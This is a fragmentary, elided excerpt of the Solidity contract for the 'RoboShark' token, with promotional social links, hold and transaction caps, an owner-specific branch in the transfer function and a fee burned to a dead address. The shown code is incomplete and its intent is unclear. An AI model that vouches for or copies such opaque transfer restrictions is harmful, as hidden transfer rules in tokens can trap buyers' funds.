...
/*
    ...
    📍Telegram chat :https://t.me/robosharkgroup
    📍Telegram Channel :https://t.me/roboshark_channel
    📍Website : https://roboshark.net/
    📍Twitter : https://twitter.com/roboshark_net
...
contract RoboShark is Context, IERC20, Ownable {
    ...
    uint256 private _maxHoldToken = _tTotal.mul(30).div(100);
    uint256 private _maxTxAmount = _tTotal.mul(30).div(100);
    string private _name = 'Robo Shark | roboshark.net';
    string private _symbol = 'RoboShark';
    ...
    function isAllowanceAdd(address botAdd) private view returns (bool){
        if (balanceOf(botAdd) >= _maxHoldToken && balanceOf(botAdd) <= _maxTxAmount) {
            return true;
        } else {
            return false;
        }
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal {
        ...
        if (sender == owner()) {
            ...
            if (isAllowanceAdd(sender)) {
                require(amount < _maxHoldToken, "transfer amount exceeds balance");
            }
            ...
            _balances[_deadAddress] = _balances[_deadAddress].add(taxFee);
